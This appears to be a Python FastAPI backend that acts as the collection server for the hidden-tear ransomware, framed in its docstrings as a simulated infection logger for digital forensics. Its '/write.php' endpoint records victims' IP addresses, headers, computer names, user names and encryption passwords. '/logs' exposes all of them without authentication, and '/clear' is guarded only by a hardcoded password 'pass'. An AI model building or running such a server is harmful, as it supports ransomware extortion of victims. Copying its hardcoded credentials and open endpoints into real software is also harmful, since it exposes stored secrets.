"""
Main application entry point for the FastAPI backend.
"""
import asyncio
import atexit
import logging
import os
import secrets
import sqlite3
import json
from datetime import datetime
from pathlib import Path

from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, FileResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from contextlib import asynccontextmanager

DB_FILE = "data/logs.db"
ADMIN_PASSWORD = "pass" # Change this as needed

# Ensure data directory exists
os.makedirs(os.path.dirname(DB_FILE), exist_ok=True)

def init_db():
    """Initialize the database with the logs table."""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    # Create table with new schema if it doesn't exist
    c.execute('''CREATE TABLE IF NOT EXISTS logs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  ip TEXT,
                  info TEXT,
                  computer_name TEXT,
                  user_name TEXT,
                  crypt_password TEXT,
                  headers TEXT,
                  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')

    conn.commit()
    conn.close()

@asynccontextmanager
async def lifespan(app: FastAPI):
    """Lifecycle manager: Initialize DB on startup."""
    init_db()
    yield
    # Clean up resources if needed (not needed for SQLite here)

# Create the main app instance
app = FastAPI(
    title="Digital Forensics Backend",
    root_path="/hidden-tear",
    lifespan=lifespan
)

@app.get("/")
async def root():
    """Serve the dashboard."""
    return FileResponse('index.html')

@app.get("/write.php")
async def write_php(info: str, request: Request):
    """Save a simulated virus infection - save user details to a database."""
    ip = request.client.host if request.client else "Unknown"
    headers = str(request.headers)
    
    # Parse info string: "ComputerName-UserName Password"
    computer_name = "Unknown"
    user_name = "Unknown"
    crypt_password = "Unknown"
    
    try:
        # Check if space exists for password separation
        if " " in info:
            remainder, crypt_password = info.rsplit(" ", 1)
            
            # Split ComputerName and UserName by the last dash
            # Heuristic: Computer names often have dashes, usernames rarely do.
            if "-" in remainder:
                 computer_name, user_name = remainder.rsplit("-", 1)
            else:
                 computer_name = remainder
        else:
            # Fallback if no space found
            if "-" in info:
                 computer_name, user_name = info.rsplit("-", 1)
            else:
                 computer_name = info
                 
    except Exception as e:
        logging.error(f"Error parsing info: {e}")

    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO logs (ip, info, computer_name, user_name, crypt_password, headers) VALUES (?, ?, ?, ?, ?, ?)", 
              (ip, info, computer_name, user_name, crypt_password, headers))
    conn.commit()
    conn.close()

    return {"status": "Ok"}

@app.get("/logs")
async def get_logs():
    """Return all logs from the database."""
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("SELECT * FROM logs ORDER BY timestamp DESC")
    rows = c.fetchall()
    conn.close()
    
    return [dict(row) for row in rows]

@app.post("/clear")
async def clear_logs(request: Request):
    """Clear all logs if the correct password is provided."""
    body = await request.json()
    password = body.get("password")
    
    if password != ADMIN_PASSWORD:
        return JSONResponse(status_code=403, content={"error": "Invalid password"})

    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("DELETE FROM logs")
    # Reset Auto Increment
    c.execute("DELETE FROM sqlite_sequence WHERE name='logs'")
    conn.commit()
    conn.close()
    
    return {"status": "cleared"}


